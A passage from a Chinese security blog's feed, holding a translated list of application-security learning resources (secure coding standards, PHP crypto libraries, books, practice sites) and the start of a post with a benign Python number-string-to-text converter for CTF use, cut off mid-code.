title="Android安全编码标准 (2015)"></a><a href="https://www.securecoding.cert.org/confluence/display/android/Android+Secure+Coding+Standard" target="_blank" rel="external">Android安全编码标准</a> (2015)</h3><p>由软件工程协会计算机安全应急响应组编写，详细地介绍了Android开发的安全编码标准。</p><h1 id="C"><a href="#C" class="headerlink" title="C"></a>C</h1><h2 id="书籍-2"><a href="#书籍-2" class="headerlink" title="书籍"></a>书籍</h2><h3 id="C安全编码标准-2006"><a href="#C安全编码标准-2006" class="headerlink" title="C安全编码标准 (2006)"></a><a href="https://www.securecoding.cert.org/confluence/display/c/SEI+CERT+C+Coding+Standard" target="_blank" rel="external">C安全编码标准</a> (2006)</h3><p>由软件工程协会计算机安全应急响应组编写，详细地介绍了C开发的安全编码标准。</p><h3 id="防御性编码：Fedora安全团队提高软件安全指南-2016"><a href="#防御性编码：Fedora安全团队提高软件安全指南-2016" class="headerlink" title="防御性编码：Fedora安全团队提高软件安全指南 (2016)"></a><a href="https://docs.fedoraproject.org/en-US/Fedora_Security_Team/1/html/Defensive_Coding/index.html" target="_blank" rel="external">防御性编码：Fedora安全团队提高软件安全指南</a> (2016)</h3><p>通过介绍安全编码来提供提高软件安全的指导。 涵盖常见的编程语言和库，并着重于具体建议。</p><h1 id="C-1"><a href="#C-1" class="headerlink" title="C++"></a>C++</h1><h2 id="书籍-3"><a href="#书籍-3" class="headerlink" title="书籍"></a>书籍</h2><h3 id="C-安全编码标准-2006"><a href="#C-安全编码标准-2006" class="headerlink" title="C++安全编码标准 (2006)"></a><a href="https://www.securecoding.cert.org/confluence/pages/viewpage.action?pageId=637" target="_blank" rel="external">C++安全编码标准</a> (2006)</h3><p>由软件工程协会计算机安全应急响应组编写，详细地介绍了C++开发的安全编码标准。</p><h1 id="C-Sharp"><a href="#C-Sharp" class="headerlink" title="C Sharp"></a>C Sharp</h1><h2 id="书籍-4"><a href="#书籍-4" class="headerlink" title="书籍"></a>书籍</h2><h3 id="安全驱动-NET-2015"><a href="#安全驱动-NET-2015" class="headerlink" title="安全驱动.NET (2015)"></a><a href="http://securitydriven.net/" target="_blank" rel="external">安全驱动.NET</a> (2015)</h3><p>介绍如何开发基于.NET Framework 4.5 安全的应用程序，具体涵盖加密和安全工程领域。</p><h1 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h1><h2 id="书籍-5"><a href="#书籍-5" class="headerlink" title="书籍"></a>书籍</h2><h3 id="Java安全编码标准-2007"><a href="#Java安全编码标准-2007" class="headerlink" title="Java安全编码标准 (2007)"></a><a href="https://www.securecoding.cert.org/confluence/display/java/SEI+CERT+Oracle+Coding+Standard+for+Java" target="_blank" rel="external">Java安全编码标准</a> (2007)</h3><p>由软件工程协会计算机安全应急响应组编写，详细地介绍Java开发的安全编码标准。</p><h3 id="Java-SE安全编指南-2014"><a href="#Java-SE安全编指南-2014" class="headerlink" title="Java SE安全编指南 (2014)"></a><a href="http://www.oracle.com/technetwork/java/seccodeguide-139067.html" target="_blank" rel="external">Java SE安全编指南</a> (2014)</h3><p>使用Oracle安全的Java编程指南。</p><h1 id="Node-js"><a href="#Node-js" class="headerlink" title="Node.js"></a>Node.js</h1><h2 id="文章-1"><a href="#文章-1" class="headerlink" title="文章"></a>文章</h2><h3 id="Node-js安全检查清单-2015"><a href="#Node-js安全检查清单-2015" class="headerlink" title="Node.js安全检查清单 (2015)"></a><a href="https://blog.risingstack.com/node-js-security-checklist/" target="_blank" rel="external">Node.js安全检查清单</a> (2015)</h3><p>提供了开发安全Node.js应用程序许多有用帮助信息。</p><h2 id="培训"><a href="#培训" class="headerlink" title="培训"></a>培训</h2><h3 id="Lift-Security团队的安全培训"><a href="#Lift-Security团队的安全培训" class="headerlink" title="Lift Security团队的安全培训"></a><a href="https://liftsecurity.io/training" target="_blank" rel="external">Lift Security团队的安全培训</a></h3><p><a href="https://nodesecurity.io" target="_blank" rel="external">Node安全培训</a></p><h1 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a>Perl</h1><h2 id="书籍-6"><a href="#书籍-6" class="headerlink" title="书籍"></a>书籍</h2><h3 id="Perl安全编码标准-2011"><a href="#Perl安全编码标准-2011" class="headerlink" title="Perl安全编码标准 (2011)"></a><a href="https://www.securecoding.cert.org/confluence/display/perl/SEI+CERT+Perl+Coding+Standard" target="_blank" rel="external">Perl安全编码标准</a> (2011)</h3><p>由软件工程协会计算机安全应急响应组编写，详细地介绍了C++开发的安全编码标准。</p><h1 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h1><h2 id="书籍-7"><a href="#书籍-7" class="headerlink" title="书籍"></a>书籍</h2><h3 id="Fedora防御编码指南中的Python章节"><a href="#Fedora防御编码指南中的Python章节" class="headerlink" title="Fedora防御编码指南中的Python章节"></a><a href="https://docs.fedoraproject.org/en-US/Fedora_Security_Team/1/html/Defensive_Coding/chap-Defensive_Coding-Python.html" target="_blank" rel="external">Fedora防御编码指南中的Python章节</a></h3><p>列出应尽量避免的函数，参考其他介绍有关Python编码安全章节。</p><h3 id="Violent-Python"><a href="#Violent-Python" class="headerlink" title="Violent Python"></a><a href="http://www.amazon.com/Violent-Python-Cookbook-Penetration-Engineers/dp/1597499579" target="_blank" rel="external">Violent Python</a></h3><p>展示如何从对攻击性计算概念的理论认识转变为实际实现。</p><h2 id="网站-1"><a href="#网站-1" class="headerlink" title="网站"></a>网站</h2><h3 id="开放式Web应用程序安全项目中的Python安全Wiki-2014"><a href="#开放式Web应用程序安全项目中的Python安全Wiki-2014" class="headerlink" title="开放式Web应用程序安全项目中的Python安全Wiki (2014)"></a><a href="https://github.com/ebranca/owasp-pysec/wiki" target="_blank" rel="external">开放式Web应用程序安全项目中的Python安全Wiki</a> (2014)</h3><p>开放式Web应用程序安全项目中的Python安全Wiki。</p><h1 id="Ruby"><a href="#Ruby" class="headerlink" title="Ruby"></a>Ruby</h1><h2 id="书籍-8"><a href="#书籍-8" class="headerlink" title="书籍"></a>书籍</h2><h3 id="Ruby安全开发指南-2014"><a href="#Ruby安全开发指南-2014" class="headerlink" title="Ruby安全开发指南 (2014)"></a><a href="https://docs.fedoraproject.org/en-US/Fedora_Security_Team/1/html/Secure_Ruby_Development_Guide/index.html" target="_blank" rel="external">Ruby安全开发指南</a> (2014)</h3><p>Fedora安全团队确保Ruby安全开发的指南，可在<a href="https://github.com/jrusnack/secure-ruby-development-guide" target="_blank" rel="external">Github</a>上获取。</p><h1 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h1><h2 id="文章-2"><a href="#文章-2" class="headerlink" title="文章"></a>文章</h2><h3 id="关于时间的一切-2014"><a href="#关于时间的一切-2014" class="headerlink" title="关于时间的一切 (2014)"></a><a href="http://blog.ircmaxell.com/2014/11/its-all-about-time.html" target="_blank" rel="external">关于时间的一切</a> (2014)</h3><p>深入浅出地介绍PHP应用程序中的有关时序攻击。</p><h3 id="实现PHP长期持久性安全认证-2015"><a href="#实现PHP长期持久性安全认证-2015" class="headerlink" title="实现PHP长期持久性安全认证 (2015)"></a><a href="https://paragonie.com/blog/2015/04/secure-authentication-php-with-long-term-persistence" target="_blank" rel="external">实现PHP长期持久性安全认证</a> (2015)</h3><p>讨论密码策略，密码存储，“记住我”，Cookie和帐户恢复相关话题。</p><h3 id="PHP中防止跨站脚本攻击20个点子-2013"><a href="#PHP中防止跨站脚本攻击20个点子-2013" class="headerlink" title="PHP中防止跨站脚本攻击20个点子 (2013)"></a><a href="http://blog.astrumfutura.com/2013/04/20-point-list-for-preventing-cross-site-scripting-in-php" target="_blank" rel="external">PHP中防止跨站脚本攻击20个点子</a> (2013)</h3><p>Padriac Brady给出的关于构建不易受XSS影响的程序建议</p><h3 id="针对系统管理员最佳PHP安全配置25点建议-2011"><a href="#针对系统管理员最佳PHP安全配置25点建议-2011" class="headerlink" title="针对系统管理员最佳PHP安全配置25点建议 (2011)"></a><a href="http://www.cyberciti.biz/tips/php-security-best-practices-tutorial.html" target="_blank" rel="external">针对系统管理员最佳PHP安全配置25点建议</a> (2011)</h3><p>虽然这篇文章有点久了，不过面向PHP 7，其中大部分的建议仍然是极具参考价值的。</p><h3 id="PHP数据加密入门介绍-2014"><a href="#PHP数据加密入门介绍-2014" class="headerlink" title="PHP数据加密入门介绍 (2014)"></a><a href="https://timoh6.github.io/2014/06/16/PHP-data-encryption-cheatsheet.html" target="_blank" rel="external">PHP数据加密入门介绍</a> (2014)</h3><p>@timoh6详细介绍PHP数据加密的实现。</p><h3 id="PHP应用程序防止SQL注入简明指南-2014"><a href="#PHP应用程序防止SQL注入简明指南-2014" class="headerlink" title="PHP应用程序防止SQL注入简明指南 (2014)"></a><a href="https://paragonie.com/blog/2015/05/preventing-sql-injection-in-php-applications-easy-and-definitive-guide" target="_blank" rel="external">PHP应用程序防止SQL注入简明指南</a> (2014)</h3><p>简单明了地介绍如何防止SQL注入。</p><h3 id="你不该使用Base64密码-2015"><a href="#你不该使用Base64密码-2015" class="headerlink" title="你不该使用Base64密码 (2015)"></a><a href="https://paragonie.com/blog/2015/08/you-wouldnt-base64-a-password-cryptography-decoded" target="_blank" rel="external">你不该使用Base64密码</a> (2015)</h3><p>通常被误用的加密术语和基本概念的可读概述，以PHP中的代码为示例，如果您对加密术语感到困惑，就从这里开始学习吧。</p><h3 id="PHP应用程序安全数据加密指南-2015"><a href="#PHP应用程序安全数据加密指南-2015" class="headerlink" title="PHP应用程序安全数据加密指南 (2015)"></a><a href="https://paragonie.com/white-paper/2015-secure-php-data-encryption" target="_blank" rel="external">PHP应用程序安全数据加密指南</a> (2015)</h3><p>讨论端到端网络层加密（HTTPS）的重要性以及静态数据的安全加密，然后介绍开发人员应该为特定用例使用的特定加密工具， <a href="https://pecl.php.net/package/libsodium" target="_blank" rel="external">libsodium</a>、<a href="https://github.com/defuse/php-encryption" target="_blank" rel="external">增强防御的安全PHP加密库</a>以及OpenSSL。</p><h2 id="书籍-9"><a href="#书籍-9" class="headerlink" title="书籍"></a>书籍</h2><h3 id="PHP安全：核心理念"><a href="#PHP安全：核心理念" class="headerlink" title="PHP安全：核心理念"></a><a href="https://leanpub.com/securingphp-coreconcepts" target="_blank" rel="external">PHP安全：核心理念</a></h3><p>介绍了一些最常见的安全性方面知识，并提供PHP其中常见的一些例子。</p><h3 id="PHP项目中使用Libsodium"><a href="#PHP项目中使用Libsodium" class="headerlink" title="PHP项目中使用Libsodium"></a><a href="https://paragonie.com/book/pecl-libsodium" target="_blank" rel="external">PHP项目中使用Libsodium</a></h3><p>调用libsodium加密库快速开发安全和可靠的应用程序。</p><h2 id="干货库"><a href="#干货库" class="headerlink" title="干货库"></a>干货库</h2><h3 id="defuse-php-encryption"><a href="#defuse-php-encryption" class="headerlink" title="defuse/php-encryption"></a><a href="https://github.com/defuse/php-encryption" target="_blank" rel="external">defuse/php-encryption</a></h3><p>用于PHP应用程序的对称密钥加密库。</p><h3 id="ircmaxell-password-compat"><a href="#ircmaxell-password-compat" class="headerlink" title="ircmaxell/password_compat"></a><a href="https://github.com/ircmaxell/password_compat" target="_blank" rel="external">ircmaxell/password_compat</a></h3><p>如果你使用PHP 5.3.7+或5.4，可以使用这个库来哈希密码。</p><h3 id="ircmaxell-RandomLib"><a href="#ircmaxell-RandomLib" class="headerlink" title="ircmaxell/RandomLib"></a><a href="https://github.com/ircmaxell/RandomLib" target="_blank" rel="external">ircmaxell/RandomLib</a></h3><p>用于生成随机字符串或数字。</p><h3 id="thephpleague-oauth2-server"><a href="#thephpleague-oauth2-server" class="headerlink" title="thephpleague/oauth2-server"></a><a href="https://github.com/thephpleague/oauth2-server" target="_blank" rel="external">thephpleague/oauth2-server</a></h3><p>安全的OAuth2服务器实现。</p><h3 id="paragonie-random-compat"><a href="#paragonie-random-compat" class="headerlink" title="paragonie/random_compat"></a><a href="https://github.com/paragonie/random_compat" target="_blank" rel="external">paragonie/random_compat</a></h3><p>PHP 7提供了一组新的伪随机数生成器（Cryptographically Secure Pseudo-Random Number Generato，CSPRNG）函数：<code>random_bytes()</code>和<code>random_int()</code>， 社区致力于在PHP 5（向前兼容）中提供公开统一的API。</p><h3 id="psecio-gatekeeper"><a href="#psecio-gatekeeper" class="headerlink" title="psecio/gatekeeper"></a><a href="https://github.com/psecio/gatekeeper" target="_blank" rel="external">psecio/gatekeeper</a></h3><p>一个安全的认证和授权库，基于角色的访问控制实现和<a href="https://paragonie.com/blog/2015/04/secure-authentication-php-with-long-term-persistence#title.2" target="_blank" rel="external">Paragon Initiative Enterprise公司</a>给出的安全“记住我”复选框建议。</p><h3 id="openwall-phpass"><a href="#openwall-phpass" class="headerlink" title="openwall/phpass"></a><a href="http://www.openwall.com/phpass/" target="_blank" rel="external">openwall/phpass</a></h3><p>用于PHP应用程序的便携式公有领域密码哈希框架。</p><h2 id="网站-2"><a href="#网站-2" class="headerlink" title="网站"></a>网站</h2><h3 id="websec-io"><a href="#websec-io" class="headerlink" title="websec.io"></a><a href="http://websec.io" target="_blank" rel="external">websec.io</a></h3><p>致力于通过基础安全知识，新兴技术和PHP安全编码相关的主题来提高开发人员有关安全意识。</p><h3 id="博客-1"><a href="#博客-1" class="headerlink" title="博客"></a>博客</h3><h4 id="Paragon-Initiative-Enterprises-Blog"><a href="#Paragon-Initiative-Enterprises-Blog" class="headerlink" title="Paragon Initiative Enterprises Blog"></a><a href="https://paragonie.com/blog/" target="_blank" rel="external">Paragon Initiative Enterprises Blog</a></h4><p>位于佛罗里达州奥兰多安全技术咨询公司博客</p><h4 id="ircmaxell’s-blog"><a href="#ircmaxell’s-blog" class="headerlink" title="ircmaxell’s blog"></a><a href="http://blog.ircmaxell.com" target="_blank" rel="external">ircmaxell’s blog</a></h4><p>介绍关于PHP安全和性能以及Web应用程序开发的博客。</p><h4 id="Padraic-Brady’s-Blog"><a href="#Padraic-Brady’s-Blog" class="headerlink" title="Pádraic Brady’s Blog"></a><a href="http://blog.astrumfutura.com" target="_blank" rel="external">Pádraic Brady’s Blog</a></h4><p>PádraicBrady是Zend Framework领域的安全专家。</p><h3 id="订阅"><a href="#订阅" class="headerlink" title="订阅"></a>订阅</h3><h4 id="Securing-PHP-Weekly"><a href="#Securing-PHP-Weekly" class="headerlink" title="Securing PHP Weekly"></a><a href="http://securingphp.com" target="_blank" rel="external">Securing PHP Weekly</a></h4><p>每周更新有关PHP安全知识。</p>]]></content>
    
    <summary type="html">
    
      #超棒应用程序安全清单超棒应用程序安全清单 AWESOME
[HTTPS://CDN.RAWGIT.COM/SINDRESORHUS/AWESOME/D7305F38D29FED78FA85652E3A63E154DD8E8829/MEDIA/BADGE.SVG]
[HTTPS://GITHUB.COM/SINDRESORHUS/AWESOME]
#0X00-前言0X00 前言
Personal Blog [https://www.hackfun.org/]

Github Adress [https://github.com/sunnyelf/awesome-application-security]

English Version [https://github.com/paragonie/awesome-appsec]

#0X01-正文0X01 正文
English Version [https://github.com/paragonie/awesome-appsec]

学习应用程序安全的资源列表，包含书籍，网站，博客文章和自我评估测验等，由Paragon Initiative Enterprises
[https://paragonie.com]公司维护，由应用安全开发社区贡献，我们其他社区项目
[https://paragonie.com/projects]可能对未来的应用安全领域也有用哦，如果你是应用安全的小白，那可能会从深入浅出讲应用安全
[https://paragonie.com/blog/2015/08/gentle-introduction-application-security]
一文中受益。

#贡献贡献
请参考贡献指南了解详情
[https://github.com/paragonie/awesome-appsec/blob/master/CONTRIBUTING.md].

#目录目录
 * 通用 * 文章 * 如何安全地生成随机数
         [http://sockpuppet.org/blog/2014/02/25/safely-generate-random-numbers/]
         (2014)
       * 加盐哈希密码的正确姿势 [https://crackstation.net/hashing-security.htm] (2014)
       * /dev/urandom不当的使用
         [http://insanecoding.blogspot.co.uk/2014/05/a-good-idea-with-bad-usage-devurandom.html]
         (2014)
       * Why Invest in Application Security?
         [https://paragonie.com/white-paper/2015-why-invest-application-security]
         (2015)
       * 警惕多次使用一次性密钥和其他奇葩的加密方式
         [https://freedom-to-tinker.com/blog/jbonneau/be-wary-of-one-time-pads-and-other-crypto-unicorns/]
         (2015)
      
      
    * 书籍 * 作为一个渗透测试学习者必知必读的好书推荐 [https://zhuanlan.zhihu.com/p/23561475]
       * 作为一个二进制安全学习者必知必读的书籍推荐 [https://zhuanlan.zhihu.com/p/23574346]
       * Web应用黑客手册 [http://mdsec.net/wahh] (2011)
       * 密码学工程：设计原理与实践应用
         [http://www.amazon.com/Cryptography-Engineering-Principles-Practical-Applications/dp/0470474246]
         (2010)
       * Python灰帽子：黑客与逆向工程师的Python编程之道
         [http://www.amazon.com/Gray-Hat-Python-Programming-Engineers/dp/1593271921]
         (2009)
       * 软件安全评估的艺术:识别与防范软件
         [http://www.amazon.com/The-Software-Security-Assessment-Vulnerabilities/dp/0321444426/]
         (2006)
       * C语言接口与实现：创建可重用软件的技术
         [http://www.amazon.com/Interfaces-Implementations-Techniques-Creating-Reusable/dp/0201498413/]
         (1996)
       * 逆向：逆向工程的秘密
         [http://www.amazon.com/Reversing-Secrets-Engineering-Eldad-Eilam/dp/0764574817]
         (2005)
       * JavaScript语言精粹
         [http://www.amazon.com/JavaScript-Good-Parts-Douglas-Crockford/dp/0596517742]
         (2008)
       * Windows内部实现:囊括Windows Server 2008和Windows Vista
         [http://www.amazon.com/Windows®-Internals-Including-Developer-Reference/dp/0735625301]
         (2007)
       * Mac黑客手册
         [http://www.amazon.com/The-Hackers-Handbook-Charlie-Miller/dp/0470395362]
         (2009)
       * IDA Pro权威指南:世界上最受欢迎反汇编者的非正式指南
         [http://www.amazon.com/The-IDA-Pro-Book-Disassembler/dp/1593271786]
         (2008)
       * 用TCP/IP进行网际互连（第2卷）：设计、实现与内核（ANSI C版）（第3版）
         [http://www.amazon.com/Internetworking-TCP-Vol-Implementation-Internals/dp/0139738436]
         (1998)
       * 网络算法：设计快速网络设备的跨学科方法
         [http://www.amazon.com/Network-Algorithmics-Interdisciplinary-Designing-Networking/dp/0120884771]
         (2004)
       * 计算机结构 (麻省理工学院电子电气工程与计算机科学系教材)
         [http://www.amazon.com/Computation-Structures-Electrical-Engineering-Computer/dp/0262231395]
         (1989)
       * 软件加密与解密
         [http://www.amazon.com/Surreptitious-Software-Obfuscation-Watermarking-Tamperproofing/dp/0321549252]
         (2009)
       * 安全编程：开发安全程序 [http://www.dwheeler.com/secure-programs/] (2015)
       * 安全工程：构建可靠分布式系统指南（第二版） [https://www.cl.cam.ac.uk/~rja14/book.html]
         (2008)
       * 防弹SSL和TLS：理解和部署SSL/TLS和PKI以保护服务器和Web应用安全
         [https://www.feistyduck.com/books/bulletproof-ssl-and-tls/] (2014)
      
      
    * 课程 * 计算机安全攻击（CIS 4930）FSU
         [https://www.cs.fsu.edu/~redwood/OffensiveComputerSecurity/]
       * 黑客之夜 [https://github.com/isislab/Hack-Night]
      
      
    * 网站 * Hack This Site! [http://www.hackthissite.org]
       * Enigma Group [http://www.enigmagroup.org]
       * Web App Sec Quiz [https://timoh6.github.io/WebAppSecQuiz/]
       * SecurePasswords.info [https://securepasswords.info]
       * Security News Feeds Cheat-Sheet
         [http://lzone.de/cheat-sheet/Security-News-Feeds]
       * Open Security Training [http://opensecuritytraining.info/]
       * MicroCorruption [https://microcorruption.com/login]
       * The Matasano Crypto Challenges [http://cryptopals.com]
       * PentesterLab [https://pentesterlab.com]
       * Juice Shop [https://bkimminich.github.io/juice-shop]
       * Supercar Showdown [http://hackyourselffirst.troyhunt.com/]
       * 博客 * Crypto Fails [http://cryptofails.com]
          * NCC Group
            [https://www.nccgroup.trust/us/about-us/newsroom-and-events/blog/]
          * Scott Helme [https://scotthelme.co.uk]
         
         
       * Wiki * OWASP Top Ten Project
            [https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project]
         
         
       * 工具 * Qualys SSL Labs [https://www.ssllabs.com/]
          * securityheaders.io [https://securityheaders.io/]
          * report-uri.io [https://report-uri.io]
         
         
      
      
   
   
 * Android * 书籍 * Android安全编码标准
         [https://www.securecoding.cert.org/confluence/display/android/Android
         Secure Coding Standard] (2015)
      
      
   
   
 * C * 书籍 * C安全编码标准 [https://www.securecoding.cert.org/confluence/display/c/SEI
         CERT C Coding Standard] (2006)
       * 防御性编码：Fedora安全团队提高软件安全指南
         [https://docs.fedoraproject.org/en-US/Fedora_Security_Team/1/html/Defensive_Coding/index.html]
         (2016)
      
      
   
   
 * C * 书籍 * C 安全编码标准
         [https://www.securecoding.cert.org/confluence/pages/viewpage.action?pageId=637]
         (2006)
      
      
   
   
 * C Sharp * 书籍 * 安全驱动.NET [http://securitydriven.net/] (2015)
      
      
   
   
 * Java * 书籍 * Java安全编码标准
         [https://www.securecoding.cert.org/confluence/display/java/SEI CERT
         Oracle Coding Standard for Java] (2007)
       * Java SE安全编指南
         [http://www.oracle.com/technetwork/java/seccodeguide-139067.html]
         (2014)
      
      
   
   
 * Node.js * 文章 * Node.js安全检查清单
         [https://blog.risingstack.com/node-js-security-checklist/] (2015)
      
      
    * 培训 * Lift Security团队的安全培训 [https://liftsecurity.io/training]
      
      
   
   
 * Perl * 书籍 * Perl安全编码标准
         [https://www.securecoding.cert.org/confluence/display/perl/SEI CERT
         Perl Coding Standard] (2011)
      
      
   
   
 * Python * 书籍 * Fedora防御编码指南中的Python章节
         [https://docs.fedoraproject.org/en-US/Fedora_Security_Team/1/html/Defensive_Coding/chap-Defensive_Coding-Python.html]
       * Violent Python
         [http://www.amazon.com/Violent-Python-Cookbook-Penetration-Engineers/dp/1597499579]
      
      
    * 网站 * 开放式Web应用程序安全项目中的Python安全Wiki
         [https://github.com/ebranca/owasp-pysec/wiki] (2014)
      
      
   
   
 * Ruby * 书籍 * Ruby安全开发指南
         [https://docs.fedoraproject.org/en-US/Fedora_Security_Team/1/html/Secure_Ruby_Development_Guide/index.html]
         (2014)
      
      
   
   
 * PHP * 文章 * 关于时间的一切 [http://blog.ircmaxell.com/2014/11/its-all-about-time.html]
         (2014)
       * 实现PHP长期持久性安全认证
         [https://paragonie.com/blog/2015/04/secure-authentication-php-with-long-term-persistence]
         (2015)
       * PHP中防止跨站脚本攻击20个点子
         [http://blog.astrumfutura.com/2013/04/20-point-list-for-preventing-cross-site-scripting-in-php]
         (2013)
       * 针对系统管理员最佳PHP安全配置25点建议
         [http://www.cyberciti.biz/tips/php-security-best-practices-tutorial.html]
         (2011)
       * PHP数据加密入门介绍
         [https://timoh6.github.io/2014/06/16/PHP-data-encryption-cheatsheet.html]
         (2014)
       * PHP应用程序防止SQL注入简明指南
         [https://paragonie.com/blog/2015/05/preventing-sql-injection-in-php-applications-easy-and-definitive-guide]
         (2014)
       * 你不该使用Base64密码
         [https://paragonie.com/blog/2015/08/you-wouldnt-base64-a-password-cryptography-decoded]
         (2015)
       * PHP应用程序安全数据加密指南
         [https://paragonie.com/white-paper/2015-secure-php-data-encryption]
         (2015)
      
      
    * 书籍 * PHP安全：核心理念 [https://leanpub.com/securingphp-coreconcepts]
       * PHP项目中使用Libsodium [https://paragonie.com/book/pecl-libsodium]
      
      
    * 干货库 * defuse/php-encryption [https://github.com/defuse/php-encryption]
       * ircmaxell/password_compat
         [https://github.com/ircmaxell/password_compat]
       * ircmaxell/RandomLib [https://github.com/ircmaxell/RandomLib]
       * thephpleague/oauth2-server
         [https://github.com/thephpleague/oauth2-server]
       * paragonie/random_compat [https://github.com/paragonie/random_compat]
       * psecio/gatekeeper [https://github.com/psecio/gatekeeper]
       * openwall/phpass [http://www.openwall.com/phpass/]
      
      
    * 网站 * websec.io [http://websec.io]
       * 博客 * Paragon Initiative Enterprises Blog [https://paragonie.com/blog/]
          * ircmaxell’s blog [http://blog.ircmaxell.com]
          * Pádraic Brady’s Blog [http://blog.astrumfutura.com]
         
         
       * 订阅 * Securing PHP Weekly [http://securingphp.com]
    
    </summary>
    
      <category term="干货分享" scheme="https://sunnyelf.github.io/categories/%E5%B9%B2%E8%B4%A7%E5%88%86%E4%BA%AB/"/>
    
    
      <category term="代码审计" scheme="https://sunnyelf.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="书籍推荐" scheme="https://sunnyelf.github.io/tags/%E4%B9%A6%E7%B1%8D%E6%8E%A8%E8%8D%90/"/>
    
      <category term="安全开发指南" scheme="https://sunnyelf.github.io/tags/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91%E6%8C%87%E5%8D%97/"/>
    
      <category term="博客推荐" scheme="https://sunnyelf.github.io/tags/%E5%8D%9A%E5%AE%A2%E6%8E%A8%E8%8D%90/"/>
    
      <category term="漏洞挖掘" scheme="https://sunnyelf.github.io/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
      <category term="练习靶场" scheme="https://sunnyelf.github.io/tags/%E7%BB%83%E4%B9%A0%E9%9D%B6%E5%9C%BA/"/>
    
      <category term="应用程序安全" scheme="https://sunnyelf.github.io/tags/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E5%AE%89%E5%85%A8/"/>
    
      <category term="学习清单" scheme="https://sunnyelf.github.io/tags/%E5%AD%A6%E4%B9%A0%E6%B8%85%E5%8D%95/"/>
    
  </entry>
  
  <entry>
    <title>CTF常用到的数字串转字符串脚本</title>
    <link href="https://sunnyelf.github.io/2017/04/07/CTF%E5%B8%B8%E7%94%A8%E5%88%B0%E7%9A%84%E6%95%B0%E5%AD%97%E4%B8%B2%E8%BD%AC%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%84%9A%E6%9C%AC/"/>
    <id>https://sunnyelf.github.io/2017/04/07/CTF常用到的数字串转字符串脚本/</id>
    <published>2017-04-07T01:33:17.000Z</published>
    <updated>2017-10-02T19:22:31.871Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>CTF常用到数字串转字符串，也有许多在线的网站支持转换，不过要求这样或那样的格式要求，所以就动手写了一个自动识别转换的脚本，下载地址<a href="https://github.com/sunnyelf/auto_num_str_to_text" target="_blank" rel="external">github</a>。</p><p>下面是演示截图：</p><a id="more"></a><p><img src="https://raw.githubusercontent.com/sunnyelf/auto_num_str_to_text/master/1.png" alt="CTF常用到的数字串转字符串脚本"></p><p><img src="https://raw.githubusercontent.com/sunnyelf/auto_num_str_to_text/master/2.png" alt="CTF常用到的数字串转字符串脚本"></p><h2 id="0x01-代码"><a href="#0x01-代码" class="headerlink" title="0x01 代码"></a>0x01 代码</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># coding=utf-8</span></div><div class="line"><span class="comment"># author:admin[@hackfun.org]</span></div><div class="line"><span class="comment"># license:GPL v3</span></div><div class="line"><span class="comment"># blog:hackfun.org</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_error</span><span class="params">()</span>:</span></div><div class="line">    print(<span class="string">'[!] invailed numeric string.'</span>)</div><div class="line">    exit(<span class="number">1</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">input_filter</span><span class="params">()</span>:</span></div><div class="line">    print(<span class="string">'[*] You can input binary/decimal/hexadecimal numeric string to convert text.'</span>)</div><div class="line">    data = raw_input(<span class="string">'[&lt;] '</span>)</div><div class="line">    filter_char = []</div><div class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> xrange(<span class="number">0</span>, <span class="number">48</span>):</div><div class="line">        filter_char.append(chr(num))</div><div class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> xrange(<span class="number">58</span>, <span class="number">65</span>):</div><div class="line">        filter_char.append(chr(num))</div><div class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> xrange(<span class="number">71</span>, <span class="number">97</span>):</div><div class="line">        filter_char.append(chr(num))</div><div class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> xrange(<span 